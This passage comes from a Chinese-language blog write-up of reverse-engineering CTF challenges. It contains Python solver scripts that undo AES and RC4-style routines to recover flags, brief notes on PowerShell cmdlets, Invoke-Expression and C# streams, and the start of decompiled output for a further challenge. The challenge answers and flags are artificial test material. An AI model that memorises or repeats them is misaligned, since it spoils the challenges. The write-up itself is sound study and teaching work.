a0_new = a1[begin]</span><br><span class="line">    a1_new = a1[begin + 1]</span><br><span class="line">    a2_new = a1[begin + 2]</span><br><span class="line">    a3_new = a1[begin + 3]</span><br><span class="line">    a = a0_new ^ a1_new ^ a2_new ^ a3_new</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(a0_old ^ (((a0_old^a1_old) &lt;&lt; 1) ^ (27 *((a0_old^a1_old) &gt;&gt; 7))) == a ^ a0_new)</span><br><span class="line">    solver.add(a1_old ^ (((a2_old^a1_old) &lt;&lt; 1) ^ (27 *((a2_old^a1_old) &gt;&gt; 7))) == a ^ a1_new)</span><br><span class="line">    solver.add(a2_old  ^ (((a2_old^a3_old) &lt;&lt; 1) ^ (27 *((a2_old^a3_old) &gt;&gt; 7))) == a ^ a2_new)</span><br><span class="line">    solver.add(a3_old  ^ (((a0_old^a3_old) &lt;&lt; 1) ^ (27 *((a0_old^a3_old) &gt;&gt; 7))) == a ^ a3_new)</span><br><span class="line">    # solver.add(a0_old != a0_new)</span><br><span class="line">    solver.check()</span><br><span class="line">    ans = str(solver.model())</span><br><span class="line">    ans = ans.replace(&quot;[&quot;, &quot;&quot;).replace(&quot;]&quot;, &quot;&quot;).split(&quot;,&quot;)</span><br><span class="line">    for index, i in enumerate(ans):</span><br><span class="line">        i = i.split(&quot;=&quot;)</span><br><span class="line">        ii = int(i[1][1:], 10)</span><br><span class="line">        a1[begin + 3 - index] = ii</span><br><span class="line">    return a1</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">def sub_10001260():</span><br><span class="line">    global a1, a2</span><br><span class="line">    array_1 = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]</span><br><span class="line">    </span><br><span class="line">    for i in range(16):</span><br><span class="line">        a1[i] = target[i] ^ a2[160+i]</span><br><span class="line">    index = 10</span><br><span class="line">    while True:</span><br><span class="line">        if index &lt;= 9:</span><br><span class="line">            for i in range(16):</span><br><span class="line">                a1[i] ^= a2[16*index+i]</span><br><span class="line">            </span><br><span class="line">            for i in range(4):</span><br><span class="line">                begin = int(i * 4)</span><br><span class="line">                a1 = equationSolver(begin, a1)</span><br><span class="line">        tmp = a1[13]</span><br><span class="line">        a1[13] = a1[9]</span><br><span class="line">        a1[9] = a1[5]</span><br><span class="line">        a1[5] = a1[1] </span><br><span class="line">        a1[1] = tmp</span><br><span class="line"></span><br><span class="line">        tmp = a1[2]</span><br><span class="line">        a1[2] = a1[10]</span><br><span class="line">        a1[10] = tmp</span><br><span class="line"></span><br><span class="line">        tmp = a1[14]</span><br><span class="line">        a1[14] = a1[6]</span><br><span class="line">        a1[6] = tmp</span><br><span class="line"></span><br><span class="line">        tmp = a1[7]</span><br><span class="line">        a1[7] = a1[11]</span><br><span class="line">        a1[11] = a1[15]</span><br><span class="line">        a1[15] = a1[3]</span><br><span class="line">        a1[3] = tmp</span><br><span class="line"></span><br><span class="line">        for i in range(4):</span><br><span class="line">            for j in range(4):</span><br><span class="line">                ii = i + 4 * j</span><br><span class="line">                a1[ii] = array_1.index(a1[ii])</span><br><span class="line">        if index == 1:</span><br><span class="line">            break</span><br><span class="line">        index -= 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # a1.extend([0 for i in range(100)])</span><br><span class="line">    print(a1)</span><br><span class="line">    # for inter in range(16):</span><br><span class="line">    #     print(&quot;inter &quot;, inter)</span><br><span class="line">    #     for i in range(16):</span><br><span class="line">    #         print(chr(a1[i]^a1[i+inter]), end = &quot;&quot;)</span><br><span class="line">    #     print()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    sub_10001260()</span><br></pre></td></tr></table></figure>
<p> &emsp;突然有种茅塞顿开的感觉，AES是10轮，我这脚本里也是10轮，而且也是大概有四种操作，但是我的为啥不对，我也不知道，应该是里面有个小错误。最终盖棺定论的是array_1，搜了搜是AES的S盒初始值。看来以后不能光靠GPT啊。（GPT我把函数喂给它竟然没看出来是AES，可恶）。知道是AES就好办了，密钥是：<code>[0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0XD2, 0XA6, 0XAB, 0XF7, 0X15, 0X88, 0X09, 0XCF, 0X4F, 0X3C]</code>，密文是<code>[0X1F, 0XEA, 0XC7, 0X79, 0X55, 0X3B, 0XF8, 0X82, 0X51, 0XB3, 0X54, 0X80, 0XCF, 0XA6, 0XB6, 0X75]</code>。是AES的ECB加密，各种加密模式复习一波：</p>
<p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/AtesetEnginner/p/9870253.html">https://www.cnblogs.com/AtesetEnginner/p/9870253.html</a></p>
<p> &emsp;最终脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2022/12/16 19:53:34</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">key = [0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0XD2, 0XA6, 0XAB, 0XF7, 0X15, 0X88, 0X09, 0XCF, 0X4F, 0X3C]</span><br><span class="line">cipherText = [0X1F, 0XEA, 0XC7, 0X79, 0X55, 0X3B, 0XF8, 0X82, 0X51, 0XB3, 0X54, 0X80, 0XCF, 0XA6, 0XB6, 0X75]</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    key = bytes(key)</span><br><span class="line">    cipherText = bytes(cipherText)</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag = aes.decrypt(cipherText)</span><br><span class="line">    print(flag)</span><br><span class="line"># b&#x27;flag&#123;thisisit01&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><p> &emsp;看到很麻烦的函数别头铁直接逆，能不能多搜一搜相关数组和字符串，我真是服了我自己。</p>
<p><strong>知识点1：</strong>cmdlet是啥？</p>
<p> &emsp;<code>cmdlet</code>（命令小工具）是一种<strong>在 Windows PowerShell 中使用的命令行工具</strong>。它通常用于执行特定的任务，例如管理系统配置、查询系统信息以及运行脚本等。通常，cmdlet 的名称都是以动词开头，例如 <code>Get-Service</code>、<code>Stop-Process</code> 和 <code>Set-Content</code>。这样的命名方式有助于更清晰地表示 cmdlet 的功能。要使用 cmdlet，你需要在 Windows PowerShell 中输入它的名称，然后按照提示输入参数。例如，要查看当前系统中运行的所有服务，你可以输入 <code>Get-Service</code>，就会输出当前系统中所有运行的服务的信息，包括服务的名称、状态和类型等。</p>
<p><strong>知识点2：</strong>C#相关函数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>IO.MemoryStream</td>
<td>使用 <code>New-Object</code> cmdlet 来创建一个 <code>IO.MemoryStream</code> 对象，它用于在内存中存储数据流。</td>
</tr>
<tr>
<td>IO.Compression.DeflateStream</td>
<td>用于对数据流进行 Deflate 压缩。</td>
</tr>
<tr>
<td>IO.StreamReader</td>
<td>以特定编码从字节流中读取字符。</td>
</tr>
</tbody>
</table>
</div>
<p><strong>知识点3：</strong>C#。C++ 和 Java 的一个更简洁的替代品。C# 广泛用于开发 Windows 应用程序、Web 应用程序、游戏、移动应用程序等。</p>
<p><strong>知识点4：</strong>C#的using字段。在 C# 中，关键字 using 用于定义一个 using 块，该块可以用来自动释放对象的资源。例如，在 using 块中定义的流对象（如 FileStream、MemoryStream、DeflateStream 等）会在 using 块结束时自动关闭和释放流资源。例如，下面的代码演示了如何使用 using 块来自动释放流资源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 定义一个文件名</span><br><span class="line">string fileName = &quot;C:\\myfile.txt&quot;;</span><br><span class="line"></span><br><span class="line">// 在 using 块中定义一个文件流对象</span><br><span class="line">using (FileStream fileStream = File.OpenRead(fileName))</span><br><span class="line">&#123;</span><br><span class="line">    // 读取文件流中的数据</span><br><span class="line">    // ……</span><br><span class="line">&#125;</span><br><span class="line">// using 块结束后，文件流资源自动关闭和释放</span><br></pre></td></tr></table></figure>
<p><strong>知识点5：</strong>Invoke-Expression 命令是 PowerShell 中的一个 cmdlet，它可以执行指定的字符串表达式，并返回表达式的结果。例如，下面的代码演示了如何使用 Invoke-Expression 命令来执行表达式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression &quot;1 + 2 * 3&quot;</span><br></pre></td></tr></table></figure>
<p><strong>知识点6：</strong>为什么ps1脚本中的函数在C#中也能使用？</p>
<p> &emsp;Powershell和C#本质都是调的系统函数，当然可以用。</p>
<hr>
<h1 id="reverse-re1"><a href="#reverse-re1" class="headerlink" title="reverse_re1"></a>reverse_re1</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p> 简介是玫瑰玫瑰我爱你，什么勾八。文件是64位的C++。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p> &emsp;主要就是俩函数，<code>sub_55A686E008F0</code>是生成v4变量，与输入无关，<code>sub_55A686E00A62</code>则是输入与v4做一些处理，最后于<code>unk_55A686E010A0</code>作比较。</p>
<p><img src="/images/re-part-5/image-20221217112700104-16798020973225.png" alt="image-20221217112700104"></p>
<p> &emsp;直接上脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2022/12/16 20:52:54</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">unk_10A0 = [0x12, 0xF8, 0xA3, 0x80, 0x6B, 0x2E, 0x69, 0x0A, 0x74, 0x24, 0xB7, 0x32, 0x53, 0xFC, 0x7A, 0x9D, 0xE8, 0x7B, 0x9B, 0x2E, 0xEF, 0xF3, 0x0B, 0x45, 0x63, 0x01, 0x35, 0xB7, 0x76, 0x8C, 0xCB, 0xD9, 0xC6, 0x8B, 0x8C, 0x2A, 0xA8, 0xAD, 0x67, 0x09, 0x5C, 0x0F, 0x52, 0xD4, 0x9D, 0x27, 0xC3, 0xD0, 0xC5, 0x91, 0xC0, 0xEA, 0xBF, 0x0D, 0xE7, 0x6C, 0x1A, 0x6A, 0x1A, 0x12, 0xB7, 0xB8, 0x18, 0xB9, 0x46, 0xC3, 0x5B, 0x90, 0x45, 0x7B, 0x94, 0xE6, 0x5F, 0x4F, 0xF0, 0x66, 0x78, 0xCC, 0xE9, 0xBE, 0x0B, 0x94, 0x84, 0x0F, 0x33, 0xAE, 0x97, 0x88, 0x45, 0x4E, 0xD2, 0x76, 0x11, 0x8E, 0x99, 0xFC, 0xCA, 0xD5, 0xE6, 0x27, 0x57, 0x74, 0x01, 0x98, 0x0A, 0xCD, 0x7F, 0x0D, 0xA2, 0xC5, 0xAB, 0xA2, 0x05, 0xA2, 0x86, 0xD3, 0x0E, 0x3A, 0x8E, 0xBA, 0xCC, 0x43, 0xA0, 0xBC, 0x30, 0x1C, 0x7B, 0x42, 0x02, 0xDC, 0xA4, 0xAA, 0x06, 0x89, 0x97, 0xAF, 0x81, 0xC0, 0x8A, 0x0B, 0xF7, 0x6C, 0xFE, 0x30, 0x97, 0x17, 0xEA, 0x79, 0x4F, 0x48, 0x5B, 0xD3, 0xCF, 0x91, 0xD6, 0xF6, 0x73, 0xA9, 0x16, 0x46, 0xB7, 0x5E, 0x63, 0x08, 0x3A, 0x1F, 0x0C, 0xB8, 0xE4, 0xBB, 0x52, 0x2E, 0xAE, 0xED, 0x46, 0x51, 0x82, 0x22, 0xE7, 0x70, 0x33, 0x7C, 0xF8, 0x45, 0x45, 0x33, 0xCA, 0x72, 0x66, 0xCF, 0xC9, 0x2E, 0x5C, 0x45, 0xC1, 0xD1, 0x0A, 0x66, 0xD7, 0x51, 0xA1, 0x74, 0xCC, 0x4A, 0x71, 0xDF, 0xDC, 0x76, 0xEA, 0x9A, 0x11, 0x22, 0x1A, 0x6A, 0x5A, 0x75, 0x12, 0x46, 0x38, 0x6C, 0x63, 0x88, 0x75, 0x20, 0xD5, 0x3C, 0xF8, 0xB5, 0x2F, 0x45, 0x6F, 0x34, 0x8F, 0x9D, 0x10, 0xA8, 0xB3, 0x19, 0x4F, 0xCA, 0xEE, 0x0D, 0xD9, 0xE6, 0xA9, 0x76, 0xEE, 0x97, 0x8E, 0x12, 0x91, 0xED, 0x9A, 0x3C, 0x34, 0xA4, 0xB0, 0x33, 0xAF, 0xC9, 0xFE, 0x7F, 0x00, 0x00, 0xAF, 0x68, 0xCA, 0x91, 0x61, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9D, 0x2A, 0x06, 0x92, 0x61, 0x7F, 0x00, 0x00, 0x50, 0x37, 0xAF, 0xC9, 0x01, 0x00, 0x00, 0x00, 0x45, 0x02, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x33, 0xAF, 0xC9, 0xFE, 0x7F, 0x00, 0x00, 0x83, 0x62, 0x01, 0x00, 0x03, 0x00, 0x00, 0x00, 0x40, 0x11, 0x28, 0x92, 0x61, 0x7F, 0x00, 0x00, 0x60, 0x1D, 0x28, 0x92, 0x61, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x56, 0x00, 0x00, 0x01, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x02, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xED, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x84, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x2C, 0x58, 0x5F, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x12, 0x67, 0x03, 0x00, 0x00, 0x00, 0x00, 0x91, 0x64, 0xDA, 0x5E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x12, 0x56, 0x5F, 0x00, 0x00, 0x00, 0x00, 0x8C, 0x2A, 0x9D, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x49, 0xE4, 0x9D, 0xD8, 0x46, 0x56, 0x00, 0x00]</span><br><span class="line"></span><br><span class="line">def sub_8F0():</span><br><span class="line">    a1 = [0 for i in range(528)]</span><br><span class="line">    a2 = [0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]</span><br><span class="line">    a3 = 8</span><br><span class="line"></span><br><span class="line">    v4 = 0</span><br><span class="line">    a1[512] = 1</span><br><span class="line">    a1[516] = 1</span><br><span class="line">    for i in range(8):</span><br><span class="line">        a1[i] = i</span><br><span class="line">    qword_F80 = [i for i in range(256)]</span><br><span class="line">    for i in range(8):</span><br><span class="line">        a1[248 + i] = qword_F80[248 + i]</span><br><span class="line"></span><br><span class="line">    # 假设 a1 的起始地址就是 8 的整数倍</span><br><span class="line">    for i in range(248):</span><br><span class="line">        a1[i] = qword_F80[i]</span><br><span class="line">    # a1 = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x7F, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x80, 0x51, 0x0D, 0xE3, 0xFD, 0x7F, 0x00, 0x00, 0x08, 0x69, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0xF0, 0x0A, 0x58, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x50, 0x16, 0x58, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x00, 0x60, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x12, 0x6C, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x65, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x50, 0xFA, 0x57, 0x41, 0x98, 0x7F, 0x00, 0x00, 0xD8, 0x68, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x41, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0xB8, 0x51, 0x52, 0x41, 0x98, 0x7F, 0x00, 0x00, 0xCD, 0x0D, 0xC0, 0xC7, 0x0D, 0x56, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x58, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x71, 0x8F, 0x55, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x69, 0x54, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x80, 0x16, 0x56, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x55, 0x0D, 0xE3, 0xFD, 0x7F, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x55, 0x0D, 0xE3, 0xFD, 0x7F, 0x00, 0x00, 0xCD, 0x0D, 0xC0, 0xC7, 0x0D, 0x56, 0x00, 0x00, 0xAE, 0xBD, 0x55, 0x41, 0x98, 0x7F, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0xC7, 0x0D, 0x56, 0x00, 0x00]</span><br><span class="line">    for i in range(0xff + 1):</span><br><span class="line">        v4 = (v4 + a1[i] + a2[i % a3]) &amp; 0xff</span><br><span class="line">        v5 = a1[i]</span><br><span class="line">        a1[i] = a1[v4]</span><br><span class="line">        a1[v4] = v5</span><br><span class="line">    </span><br><span class="line">    for i in range(256):</span><br><span class="line">        a1[256 + i] = a1[i]</span><br><span class="line">    </span><br><span class="line">    return a1</span><br><span class="line"></span><br><span class="line">def sub_A62():</span><br><span class="line">    a1 = sub_8F0()</span><br><span class="line">    a2 = [0 for i in range(520)]</span><br><span class="line">    a3 = unk_10A0</span><br><span class="line">    a4 = 256</span><br><span class="line"></span><br><span class="line">    v8 = a1[512]</span><br><span class="line">    v5 = a1[520]</span><br><span class="line">    i = v8</span><br><span class="line"></span><br><span class="line">    for _ in range(len(unk_10A0)):</span><br><span class="line">        if a4 + v8 &lt;= i:</span><br><span class="line">            break</span><br><span class="line">        v5 = (v5 + a1[i]) &amp; 0xff</span><br><span class="line">        v6 = a1[i] &amp; 0xff</span><br><span class="line">        a1[i] = a1[v5]</span><br><span class="line">        a1[v5] = v6</span><br><span class="line">        a2[i - v8] = a3[i - v8] ^ a1[(a1[i] + a1[v5]) &amp; 0xff]</span><br><span class="line">        i += 1</span><br><span class="line">    for aa in a2:</span><br><span class="line">        print(chr(aa), end = &quot;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    sub_A62()</span><br><span class="line"></span><br><span class="line"># flag&#123;easyobaasdasasfas7214&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p> &emsp;比较简单，有失水准。</p>
<hr>
<h1 id="reverse-re2"><a href="#reverse-re2" class="headerlink" title="reverse_re2"></a>reverse_re2</h1><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p> &emsp;32位的动态链接库。</p>
<p> &emsp;找字符串找到个这个：</p>
<p><img src="/images/re-part-5/image-20221217160008945-16798020973227.png" alt="image-20221217160008945"></p>
<p><img src="/images/re-part-5/image-20221220112252891-16798020973229.png" alt="image-20221220112252891"></p>
<p> &emsp;如上图所示，其实<code>sub_4116FD</code>的内容就是<code>jmp sub_403D5A</code>。</p>
<p> &emsp;里面还有好多花指令，其中还有一个<code>.text:0041179F</code>位置上的<code>lea esp, a12345678[ecx]</code>，直接让堆栈不平衡了，可能是新开了一个函数，但是我没管这些直接<code>nop</code>掉了。最后得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  intptr_t v3; // eax</span><br><span class="line">  int v5; // eax</span><br><span class="line">  int v6; // eax</span><br><span class="line">  void *v7; // [esp+25Ch] [ebp-4A4h]</span><br><span class="line">  char Str2[39]; // [esp+268h] [ebp-498h] BYREF</span><br><span class="line">  char v9[473]; // [esp+28Fh] [ebp-471h] BYREF</span><br><span class="line">  char Str1[41]; // [esp+470h] [ebp-290h] BYREF</span><br><span class="line">  char v11[471]; // [esp+499h] [ebp-267h] BYREF</span><br><span class="line">  char Str[4]; // [esp+678h] [ebp-88h] BYREF</span><br><span class="line">  char v13[124]; // [esp+67Ch] [ebp-84h] BYREF</span><br><span class="line"></span><br><span 